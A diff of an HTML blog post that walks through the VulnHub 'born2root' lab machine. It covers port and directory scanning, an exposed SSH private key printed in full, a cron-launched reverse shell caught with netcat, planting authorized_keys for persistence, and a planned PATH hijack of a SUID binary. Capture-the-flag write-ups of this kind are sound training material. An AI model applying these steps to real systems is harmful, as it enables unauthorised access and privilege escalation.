@@ -93,11 +93,13 @@
     </header>
 
     <div class="entry-content">
-            <p><img alt="Born2root homepage" class="align-left" src="/media/2017.11/born2root/1.png" width="162"/></p>
+            <p><img class="align-left"
+src="/media/2017.11/born2root/1.png" alt="Born2root homepage" width="162"></p>
 <p>After the bulldog machine I worked on the <a href="https://www.vulnhub.com/entry/born2root-1,197/">born2root</a> one.
 A simple boot2root machine by <a href="https://twitter.com/h4d3sw0rm">Hadi Mene</a>.</p>
 
-<h2 id="discovery">Discovery</h2>
+
+<h2>Discovery</h2>
 <p>First we scan all port of the VM:</p>
 <div class="highlight"><pre><span></span>root@kalili:~# nmap -sSV 10.0.2.5
 
@@ -115,20 +117,24 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 6.74 seconds
 </pre></div>
+
+
 <p>So we got a SSH service on port 22 and a web service on the port 80.
 Let's see what the website propose:</p>
-<h2 id="web">Web</h2>
+<h2>Web</h2>
 <p>The website simulate a company selling security services:</p>
-<p><img alt="Landing page" src="/media/2017.11/born2root/1.png"/></p>
+<p><img alt="Landing page" src="/media/2017.11/born2root/1.png"></p>
 <p>The robots.txt file contain 2 url:</p>
 <div class="highlight"><pre><span></span><span class="k">User</span><span class="o">-</span><span class="n">agent</span><span class="p">:</span> <span class="o">*</span>
 <span class="n">Disallow</span><span class="p">:</span> <span class="o">/</span><span class="n">wordpress</span><span class="o">-</span><span class="n">blog</span>
 <span class="n">Disallow</span><span class="p">:</span> <span class="o">/</span><span class="n">files</span>
 </pre></div>
+
+
 <p>The <code>/wordpress-blog</code> lead us to a simple image:</p>
-<p><img alt="Troll" src="/media/2017.11/born2root/2.png"/></p>
+<p><img alt="Troll" src="/media/2017.11/born2root/2.png"></p>
 <p>The /files give us an empty directory listing:</p>
-<p><img alt="Directory listing" src="/media/2017.11/born2root/4.png"/></p>
+<p><img alt="Directory listing" src="/media/2017.11/born2root/4.png"></p>
 <p>We launch <code>dirb</code> against the site:</p>
 <div class="highlight"><pre><span></span><span class="nv">root</span>@<span class="nv">kalili</span>:<span class="o">~</span># <span class="nv">dirb</span> <span class="nv">http</span>:<span class="o">//</span><span class="mi">10</span>.<span class="mi">0</span>.<span class="mi">2</span>.<span class="mi">5</span><span class="ss">)</span>
 <span class="o">-----------------</span>
@@ -153,13 +159,15 @@ Let's see what the website propose:</p>
 <span class="o">+</span> <span class="nv">http</span>:<span class="o">//</span><span class="mi">10</span>.<span class="mi">0</span>.<span class="mi">2</span>.<span class="mi">5</span><span class="o">/</span><span class="nv">server</span><span class="o">-</span><span class="nv">status</span> <span class="ss">(</span><span class="nv">CODE</span>:<span class="mi">403</span><span class="o">|</span><span class="nv">SIZE</span>:<span class="mi">296</span><span class="ss">)</span>
 
 <span class="o">----</span> <span class="nv">Entering</span> <span class="nv">directory</span>: <span class="nv">http</span>:<span class="o">//</span><span class="mi">10</span>.<span class="mi">0</span>.<span class="mi">2</span>.<span class="mi">5</span><span class="o">/</span><span class="nv">files</span><span class="o">/</span> <span class="o">----</span>
-<span class="ss">(</span><span class="o">!</span><span class="ss">)</span> <span class="nv">WARNING</span>: <span class="nv">Directory</span> <span class="nv">IS</span> <span class="nv">LISTABLE</span>. <span class="nv">No</span> <span class="nv">need</span> <span class="nv">to</span> <span class="nv">scan</span> <span class="nv">it</span>. <span class="ss">(</span><span class="nv">Use</span> <span class="nv">mode</span> <span class="s1">'</span><span class="s">-w</span><span class="s1">'</span> <span class="k">if</span> <span class="nv">you</span> <span class="nv">want</span> <span class="nv">to</span> <span class="nv">scan</span> <span class="nv">it</span> <span class="nv">anyway</span><span class="ss">)</span>
+<span class="ss">(</span><span class="o">!</span><span class="ss">)</span> <span class="nv">WARNING</span>: <span class="nv">Directory</span> <span class="nv">IS</span> <span class="nv">LISTABLE</span>. <span class="nv">No</span> <span class="nv">need</span> <span class="nv">to</span> <span class="nv">scan</span> <span class="nv">it</span>. <span class="ss">(</span><span class="nv">Use</span> <span class="nv">mode</span> <span class="s1">&#39;</span><span class="s">-w</span><span class="s1">&#39;</span> <span class="k">if</span> <span class="nv">you</span> <span class="nv">want</span> <span class="nv">to</span> <span class="nv">scan</span> <span class="nv">it</span> <span class="nv">anyway</span><span class="ss">)</span>
 <span class="o">----</span> <span class="nv">Entering</span> <span class="nv">directory</span>: <span class="nv">http</span>:<span class="o">//</span><span class="mi">10</span>.<span class="mi">0</span>.<span class="mi">2</span>.<span class="mi">5</span><span class="o">/</span><span class="nv">icons</span><span class="o">/</span> <span class="o">----</span>
-<span class="ss">(</span><span class="o">!</span><span class="ss">)</span> <span class="nv">WARNING</span>: <span class="nv">Directory</span> <span class="nv">IS</span> <span class="nv">LISTABLE</span>. <span class="nv">No</span> <span class="nv">need</span> <span class="nv">to</span> <span class="nv">scan</span> <span class="nv">it</span>. <span class="ss">(</span><span class="nv">Use</span> <span class="nv">mode</span> <span class="s1">'</span><span class="s">-w</span><span class="s1">'</span> <span class="k">if</span> <span class="nv">you</span> <span class="nv">want</span> <span class="nv">to</span> <span class="nv">scan</span> <span class="nv">it</span> <span class="nv">anyway</span><span class="ss">)</span>
+<span class="ss">(</span><span class="o">!</span><span class="ss">)</span> <span class="nv">WARNING</span>: <span class="nv">Directory</span> <span class="nv">IS</span> <span class="nv">LISTABLE</span>. <span class="nv">No</span> <span class="nv">need</span> <span class="nv">to</span> <span class="nv">scan</span> <span class="nv">it</span>. <span class="ss">(</span><span class="nv">Use</span> <span class="nv">mode</span> <span class="s1">&#39;</span><span class="s">-w</span><span class="s1">&#39;</span> <span class="k">if</span> <span class="nv">you</span> <span class="nv">want</span> <span class="nv">to</span> <span class="nv">scan</span> <span class="nv">it</span> <span class="nv">anyway</span><span class="ss">)</span>
 <span class="o">----</span> <span class="nv">Entering</span> <span class="nv">directory</span>: <span class="nv">http</span>:<span class="o">//</span><span class="mi">10</span>.<span class="mi">0</span>.<span class="mi">2</span>.<span class="mi">5</span><span class="o">/</span><span class="nv">manual</span><span class="o">/</span> <span class="o">----</span>
 <span class="o">==&gt;</span> <span class="nv">DIRECTORY</span>: <span class="nv">http</span>:<span class="o">//</span><span class="mi">10</span>.<span class="mi">0</span>.<span class="mi">2</span>.<span class="mi">5</span><span class="o">/</span><span class="nv">manual</span><span class="o">/</span><span class="nv">da</span><span class="o">/</span>
 <span class="o">&lt;</span><span class="nv">SNIP</span><span class="o">&gt;</span>
 </pre></div>
+
+
 <p>It found an interesting directory: <code>icons</code> it contains a lot of icon and a file VDSoyuAXiO.txt:</p>
 <div class="highlight"><pre><span></span><span class="o">-----</span><span class="nv">BEGIN</span> <span class="nv">RSA</span> <span class="nv">PRIVATE</span> <span class="nv">KEY</span><span class="o">-----</span>
 <span class="nv">MIIEowIBAAKCAQEAoNgGGOyEpn</span><span class="o">/</span><span class="nv">txphuS2pDA1i2nvRxn6s8DO58QcSsY</span><span class="o">+/</span><span class="nv">Nm6wC</span>
@@ -189,12 +197,18 @@ Let's see what the website propose:</p>
 <span class="nv">rlJ7dOFH7OFQbGp51ub88M1VOiXR6</span><span class="o">/</span><span class="nv">fU8OMOkXfi1KkETj</span><span class="o">/</span><span class="nv">xp6t</span><span class="o">+</span>
 <span class="o">-----</span><span class="k">END</span> <span class="nv">RSA</span> <span class="nv">PRIVATE</span> <span class="nv">KEY</span><span class="o">-----</span>
 </pre></div>
+
+
 <p>This looks like an ssh private key. We extract the associated public key:</p>
 <div class="highlight"><pre><span></span><span class="n">openssl</span> <span class="n">rsa</span> <span class="o">-</span><span class="k">in</span> <span class="p">.</span><span class="n">ssh</span><span class="o">/</span><span class="n">id_rsa</span> <span class="o">-</span><span class="n">pubout</span> <span class="o">-</span><span class="k">out</span> <span class="k">key</span><span class="p">.</span><span class="n">pub</span>
 </pre></div>
+
+
 <p>And we convert it to  ssh format:</p>
 <div class="highlight"><pre><span></span><span class="n">ssh</span><span class="o">-</span><span class="n">keygen</span> <span class="o">-</span><span class="n">f</span> <span class="k">key</span><span class="p">.</span><span class="n">pub</span> <span class="o">-</span><span class="n">i</span> <span class="o">-</span><span class="n">mPKCS8</span>
 </pre></div>
+
+
 <p>The we can copy the private key to <code>~/.ssh/id_rsa</code> and the public key to <code>~/.ssh/id_rsa.pub</code></p>
 <p>But we have no idea of the associated user. We try the one listed on the site main page:</p>
 <ul>
@@ -216,28 +230,32 @@ Let's see what the website propose:</p>
 <span class="cm">READY TO ACCESS THE SECRET LAB ?</span>
 
 <span class="cm">secret password : ^CTraceback (most recent call last):</span>
-<span class="cm">  File "/var/tmp/login.py", line 8, in &lt;module&gt;</span>
-<span class="cm">    password = raw_input("secret password : ")</span>
+<span class="cm">  File &quot;/var/tmp/login.py&quot;, line 8, in &lt;module&gt;</span>
+<span class="cm">    password = raw_input(&quot;secret password : &quot;)</span>
 <span class="cm">KeyboardInterrupt</span>
 </pre></div>
+
+
 <p>The program doesn't seems to work as intended:</p>
 <div class="highlight"><pre><span></span><span class="n">martin</span><span class="nd">@debian</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">login</span><span class="o">.</span><span class="n">py</span>
 <span class="c1">#!/usr/bin/python</span>
 
 <span class="kn">import</span> <span class="nn">os</span>
 
-<span class="k">print</span><span class="p">(</span><span class="s2">""</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="s2">"READY TO ACCESS THE SECRET LAB ? "</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="s2">""</span><span class="p">)</span>
-<span class="n">password</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s2">"secret password : "</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s2">&quot;READY TO ACCESS THE SECRET LAB ? &quot;</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">)</span>
+<span class="n">password</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s2">&quot;secret password : &quot;</span><span class="p">)</span>
 
-<span class="k">if</span> <span class="p">(</span><span class="n">password</span><span class="p">)</span> <span class="o">==</span> <span class="s2">"secretsec"</span> <span class="ow">or</span> <span class="s2">"secretlab"</span> <span class="p">:</span>
-  <span class="k">print</span><span class="p">(</span><span class="s2">"WELCOME ! "</span><span class="p">)</span>
+<span class="k">if</span> <span class="p">(</span><span class="n">password</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&quot;secretsec&quot;</span> <span class="ow">or</span> <span class="s2">&quot;secretlab&quot;</span> <span class="p">:</span>
+  <span class="k">print</span><span class="p">(</span><span class="s2">&quot;WELCOME ! &quot;</span><span class="p">)</span>
 <span class="k">else</span><span class="p">:</span>
-  <span class="k">print</span><span class="p">(</span><span class="s2">"GET OUT ! "</span><span class="p">)</span>
-  <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">"pkill -u 'martin'"</span><span class="p">)</span>
+  <span class="k">print</span><span class="p">(</span><span class="s2">&quot;GET OUT ! &quot;</span><span class="p">)</span>
+  <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;pkill -u &#39;martin&#39;&quot;</span><span class="p">)</span>
 </pre></div>
-<h2 id="privilege elevation">Privilege elevation</h2>
+
+
+<h2>Privilege elevation</h2>
 <p>As always a bit of reconnaissance is needed.</p>
 <div class="highlight"><pre><span></span><span class="n">martin</span><span class="nv">@debian</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">alRh</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="w"></span>
 <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="err">:</span><span class="w"></span>
@@ -260,6 +278,8 @@ Let's see what the website propose:</p>
 <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="n">hadi</span><span class="w"> </span><span class="n">hadi</span><span class="w"> </span><span class="mi">4</span><span class="p">,</span><span class="mi">0</span><span class="n">K</span><span class="w"> </span><span class="n">mai</span><span class="w">    </span><span class="mi">1</span><span class="w">  </span><span class="mi">2017</span><span class="w"> </span><span class="p">.</span><span class="n">ssh</span><span class="w"></span>
 <span class="o">&lt;</span><span class="n">SNIP</span><span class="o">&gt;</span><span class="w"></span>
 </pre></div>
+
+
 <p>Okay we got a program <code>buff</code> owned by root and and file <code>buff.c</code> readable by anybody but there is no suid, so no need to bother here.
 <code>martin@debian:/home/hadi$ ls -laRh /etc/cron.d</code> doesn't get us something useful but <code>cat /etc/crontab</code> seems usable:</p>
 <div class="highlight"><pre><span></span><span class="n">martin</span><span class="nv">@debian</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">hadi</span><span class="err">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">crontab</span><span class="w"> </span>
@@ -274,17 +294,23 @@ Let's see what the website propose:</p>
 <span class="mi">52</span><span class="w"> </span><span class="mi">6</span><span class="w">    </span><span class="mi">1</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w">   </span><span class="n">root</span><span class="w">    </span><span class="n">test</span><span class="w"> </span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">anacron</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">run</span><span class="o">-</span><span class="n">parts</span><span class="w"> </span><span class="c1">--report /etc/cron.monthly )</span>
 <span class="o">*/</span><span class="mi">5</span><span class="w">   </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w">   </span><span class="n">jimmy</span><span class="w">   </span><span class="n">python</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">sekurity</span><span class="p">.</span><span class="n">py</span><span class="w"></span>
 </pre></div>
+
+
 <p>Of course the script launch by jimmy in <code>tmp</code> doesn't exist. We create one with a simple python reverse shell <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentest monkey</a>:</p>
 <div class="highlight"><pre><span></span>root@kalili:~# nc -l -p 1234
-/bin/sh: 0: can't access tty; job control turned off
+/bin/sh: 0: can&#39;t access tty; job control turned off
 $ id
 uid=1002(jimmy) gid=1002(jimmy) groupes=1002(jimmy)
 </pre></div>
+
+
 <p>We add our ssh key to be able to connect with ssh:</p>
 <div class="highlight"><pre><span></span><span class="nv">$</span> <span class="nv">cd</span> <span class="sr">/home/</span><span class="n">jimmy</span>
 <span class="nv">$</span> <span class="nv">mkdir</span> <span class="o">.</span><span class="n">ssh</span>
 <span class="nv">$</span> <span class="nv">cat</span> <span class="sr">/home/m</span><span class="n">artin</span><span class="sr">/.ssh/</span><span class="n">authorized_keys</span> <span class="o">&gt;</span> <span class="o">.</span><span class="n">ssh</span><span class="o">/</span><span class="n">authorized_keys</span>
 </pre></div>
+
+
 <p>There is binary <code>networker</code> owned by root with an suid in our home directory (well jimmy's):</p>
 <div class="highlight"><pre><span></span><span class="n">jimmy</span><span class="nv">@debian</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">al</span><span class="w"></span>
 <span class="n">total</span><span class="w"> </span><span class="mi">36</span><span class="w"></span>
@@ -297,6 +323,8 @@ uid=1002(jimmy) gid=1002(jimmy) groupes=1002(jimmy)
 <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="c1">--r-- 1 jimmy jimmy  675 juin   8 21:07 .profile</span>
 <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="n">jimmy</span><span class="w"> </span><span class="n">jimmy</span><span class="w"> </span><span class="mi">4096</span><span class="w"> </span><span class="n">nov</span><span class="p">.</span><span class="w">  </span><span class="mi">17</span><span class="w"> </span><span class="mi">10</span><span class="err">:</span><span class="mi">31</span><span class="w"> </span><span class="p">.</span><span class="n">ssh</span><span class="w"></span>
 </pre></div>
+
+
 <p>It seems to give information about the network configuration, ping localhost and and echo "echo linux tool version 5":</p>
 <div class="highlight"><pre><span></span><span class="n">jimmy</span><span class="nv">@debian</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="p">.</span><span class="o">/</span><span class="n">networker</span><span class="w"> </span>
 <span class="o">***</span><span class="w"> </span><span class="n">Networker</span><span class="w"> </span><span class="mf">2.0</span><span class="w"> </span><span class="o">***</span><span class="w"> </span>
@@ -312,7 +340,7 @@ uid=1002(jimmy) gid=1002(jimmy) groupes=1002(jimmy)
 
 <span class="n">lo</span><span class="w">        </span><span class="n">Link</span><span class="w"> </span><span class="nl">encap</span><span class="p">:</span><span class="n">Boucle</span><span class="w"> </span><span class="n">locale</span><span class="w">  </span>
 <span class="w">    </span><span class="n">inet</span><span class="w"> </span><span class="nl">adr</span><span class="p">:</span><span class="mf">127.0.0.1</span><span class="w">  </span><span class="nl">Masque</span><span class="p">:</span><span class="mf">255.0.0.0</span><span class="w"></span>
-<span class="w">    </span><span class="n">adr</span><span class="w"> </span><span class="nl">inet6</span><span class="p">:</span><span class="w"> </span><span class="o">::</span><span class="mi">1</span><span class="o">/</span><span class="mi">128</span><span class="w"> </span><span class="k">Scope</span><span class="err">:</span><span class="n">H&ocirc;te</span><span class="w"></span>
+<span class="w">    </span><span class="n">adr</span><span class="w"> </span><span class="nl">inet6</span><span class="p">:</span><span class="w"> </span><span class="o">::</span><span class="mi">1</span><span class="o">/</span><span class="mi">128</span><span class="w"> </span><span class="k">Scope</span><span class="err">:</span><span class="n">Hôte</span><span class="w"></span>
 <span class="w">    </span><span class="n">UP</span><span class="w"> </span><span class="n">LOOPBACK</span><span class="w"> </span><span class="n">RUNNING</span><span class="w">  </span><span class="nl">MTU</span><span class="p">:</span><span class="mi">65536</span><span class="w">  </span><span class="nl">Metric</span><span class="p">:</span><span class="mi">1</span><span class="w"></span>
 <span class="w">    </span><span class="n">RX</span><span class="w"> </span><span class="nl">packets</span><span class="p">:</span><span class="mi">6</span><span class="w"> </span><span class="nl">errors</span><span class="p">:</span><span class="mi">0</span><span class="w"> </span><span class="nl">dropped</span><span class="p">:</span><span class="mi">0</span><span class="w"> </span><span class="nl">overruns</span><span class="p">:</span><span class="mi">0</span><span class="w"> </span><span class="nl">frame</span><span class="p">:</span><span class="mi">0</span><span class="w"></span>
 <span class="w">    </span><span class="n">TX</span><span class="w"> </span><span class="nl">packets</span><span class="p">:</span><span class="mi">6</span><span class="w"> </span><span class="nl">errors</span><span class="p">:</span><span class="mi">0</span><span class="w"> </span><span class="nl">dropped</span><span class="p">:</span><span class="mi">0</span><span class="w"> </span><span class="nl">overruns</span><span class="p">:</span><span class="mi">0</span><span class="w"> </span><span class="nl">carrier</span><span class="p">:</span><span class="mi">0</span><span class="w"></span>
@@ -329,6 +357,8 @@ uid=1002(jimmy) gid=1002(jimmy) groupes=1002(jimmy)
 <span class="n">echo</span><span class="w"> </span><span class="n">linux</span><span class="w"> </span><span class="n">tool</span><span class="w"> </span><span class="n">version</span><span class="w"> </span><span class="mi">5</span><span class="w"></span>
 <span class="n">Vous</span><span class="w"> </span><span class="n">avez</span><span class="w"> </span><span class="n">du</span><span class="w"> </span><span class="n">nouveau</span><span class="w"> </span><span class="n">courrier</span><span class="w"> </span><span class="n">dans</span><span class="w"> </span><span class="o">/</span><span class="nf">var</span><span class="o">/</span><span class="n">mail</span><span class="o">/</span><span class="n">jimmy</span><span class="w"></span>
 </pre></div>
+
+
 <p>Getting the strings in the program give us the following:</p>
 <div class="highlight"><pre><span></span><span class="n">jimmy</span><span class="nv">@debian</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">strings</span><span class="w"> </span><span class="n">networker</span><span class="w"> </span>
 <span class="o">&lt;</span><span class="n">SNIP</span><span class="o">&gt;</span><span class="w"></span>
@@ -336,9 +366,11 @@ uid=1002(jimmy) gid=1002(jimmy) groupes=1002(jimmy)
 <span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">ifconfig</span><span class="w"></span>
 <span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">ping</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="mi">1</span><span class="w">  </span><span class="n">localhost</span><span class="w"> </span>
 <span class="n">Done</span><span class="w"> </span>
-<span class="n">echo</span><span class="w"> </span><span class="s1">'echo linux tool version 5'</span><span class="w"></span>
+<span class="n">echo</span><span class="w"> </span><span class="s1">&#39;echo linux tool version 5&#39;</span><span class="w"></span>
 <span class="o">&lt;</span><span class="n">SNIP</span><span class="o">&gt;</span><span class="w"></span>
 </pre></div>
+
+
 <p>So <code>ping</code> and <code>ifconfig</code> seem to be loaded from an absolute path but not the <code>echo</code> command. We shall be able to
 make our own echo binary and change the path to execute our binary (a reverse shell) instead of echo.</p>
 <p>But the binary use the absolute path and we didn't achieve to be root.
